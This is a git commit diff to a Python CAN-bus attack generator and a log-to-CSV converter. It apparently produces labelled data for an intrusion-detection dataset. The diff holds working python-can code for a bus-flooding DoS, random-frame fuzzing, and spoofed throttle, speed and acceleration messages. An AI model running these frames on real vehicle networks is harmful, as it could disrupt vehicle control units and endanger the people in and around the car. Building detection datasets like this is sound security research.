9ff4f4a80055b9285bc1229863a738128c31f959
fabiopapais <fabiopapais0@gmail.com>
2024-05-28 11:28:45 -0300

    Auto labelling based on extended id

--- attack_gen.py
+++ attack_gen.py
@@ -23,55 +23,55 @@ def generate_random_bytes():
         bytes.append(random.randrange(0, 255))
     return bytes
 
-def dos_attack(interval=0.0002, duration=5):
+def dos_attack(interval=0.0002, duration=5, use_extended_id=False):
     """Sends a strem of high-priority message."""
     print("Starting DoS Attack")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=0x000, data=[0, 0, 0, 0, 0, 0, 0, 0], is_extended_id=False)
+        msg = can.Message(arbitration_id=0x000, data=[0, 0, 0, 0, 0, 0, 0, 0], is_extended_id=use_extended_id)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
         task.stop()
     print("Stopped DoS cyclic send")
 
-def fuzzy_attack(interval=0.003, duration=5):
+def fuzzy_attack(interval=0.003, duration=5, use_extended_id=False):
     """Sends stream of random id and payload messages."""
     print("Starting Fuzzy Attack")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=random.randrange(0, 4095), data=generate_random_bytes(), is_extended_id=False)
+        msg = can.Message(arbitration_id=random.randrange(0, 4095), data=generate_random_bytes(), is_extended_id=use_extended_id)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
         task.stop()
     print("Stopped Fuzzy attack")
 
-def throt_spoofing(interval=0.01, duration=5):
+def throt_spoofing(interval=0.01, duration=5, use_extended_id=False):
     """Sends falsified throttle message."""
     print("Starting Throttle Spoofing")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 17, 00, 00, 00, 00, 00], is_extended_id=False)
+        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 17, 00, 00, 00, 00, 00], is_extended_id=use_extended_id)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
         task.stop()
     print("Stopped Throttle Spoofing")
 
-def speed_spoofing(interval=0.01, duration=5):
+def speed_spoofing(interval=0.01, duration=5, use_extended_id=False):
     """Sends falsified throttle message."""
     print("Starting Vehicle Speed Spoofing")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 13, 00, 00, 00, 00, 00], is_extended_id=False)
+        msg = can.Message(arbitration_id=0x7E2, data=[00, 65, 13, 00, 00, 00, 00, 00], is_extended_id=use_extended_id)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
         task.stop()
     print("Stopped Vehicle Speed Spoofing")
 
-def acelleration_spoofing(interval=0.01, duration=5):
+def acelleration_spoofing(interval=0.01, duration=5, use_extended_id=False):
     """Sends falsified acelleration response message."""
     print("Starting Acceleration Spoofing")
     for i in range(int(duration / interval)):
-        msg = can.Message(arbitration_id=0x7E0, data=[00, 65, 73, 00, 00, 00, 00, 00], is_extended_id=False)
+        msg = can.Message(arbitration_id=0x7E0, data=[00, 65, 73, 00, 00, 00, 00, 00], is_extended_id=use_extended_id)
         task = bus.send_periodic(msg, interval)
         assert isinstance(task, can.CyclicSendTaskABC)
         time.sleep(interval)
@@ -82,13 +82,13 @@ if __name__ == "__main__":
     command = sys.argv[1]
 
     if command == "serial_attack":
-        dos_attack()
-        fuzzy_attack()
-        throt_spoofing()
-        speed_spoofing()
-        acelleration_spoofing()
-
-    if len(sys.argv) > 3:
+        use_extended_id = (len(sys.argv) > 2) and (sys.argv[2] == "dataset_gen") 
+        dos_attack(use_extended_id=use_extended_id)
+        fuzzy_attack(use_extended_id=use_extended_id)
+        throt_spoofing(use_extended_id=use_extended_id)
+        speed_spoofing(use_extended_id=use_extended_id)
+        acelleration_spoofing(use_extended_id=use_extended_id)
+    elif len(sys.argv) > 3:
         duration = int(sys.argv[2])
         interval = float(sys.argv[3])
         if (command == "dos"):
--- log2csv.py
+++ log2csv.py
@@ -10,11 +10,20 @@ with open(path, 'r') as file: log_lines = list(file)
 for i, line in enumerate(log_lines):
     separated_line = line.strip().split()
     id, payload = separated_line[2].split('#')
+    # checks if is extended id to generate labels automatically (our standard)
+    auto_label = ''
+    if label == 'auto':
+        if len(id) > 3: # extended id
+            auto_label = 'MALIGN'
+        else: # standard id
+            auto_label = 'BENIGN'
+    else:
+        auto_label = label
     bytes = [int(payload[i:i+2], 16) for i in range(0, len(payload), 2)]
     if len(bytes) < 8: # fill blank bytes with -1
         bytes += [-1] * (8 - len(bytes))
     # timestamp, id, and 8 bytes of data all converted to decimal
-    log_lines[i] = [float(separated_line[0][1:-1]), int(id, 16)] + bytes
+    log_lines[i] = [float(separated_line[0][1:-1]), auto_label, int(id, 16)] + bytes
 
 # creates 'time_interval' and 'same_id_time_interval' columns
 last_timestamps = {}
@@ -28,8 +37,7 @@ for i in range(1, len(log_lines)):
         else:
             log_lines[i].append(log_lines[i][0] - last_timestamps[log_lines[i][1]])
             last_timestamps[log_lines[i][1]] = log_lines[i][0]
-    log_lines[i] += [label]
-log_lines[0] += [0, 0, label]
+log_lines[0] += [0, 0]
 
 # removes timestamp
 log_lines = [line[1:] for line in log_lines]
@@ -37,5 +45,5 @@ log_lines = [line[1:] for line in log_lines]
 # writes data in csv file 
 with open(path[:-3] + 'csv', 'w', newline='') as file:
     writer = csv.writer(file)
-    writer.writerow(['id', 'byte0', 'byte1', 'byte2', 'byte3', 'byte4', 'byte5', 'byte6', 'byte7', 'time_interval', 'same_id_time_interval', 'label'])
+    writer.writerow(['label', 'id', 'byte0', 'byte1', 'byte2', 'byte3', 'byte4', 'byte5', 'byte6', 'byte7', 'time_interval', 'same_id_time_interval'])
     writer.writerows(log_lines)
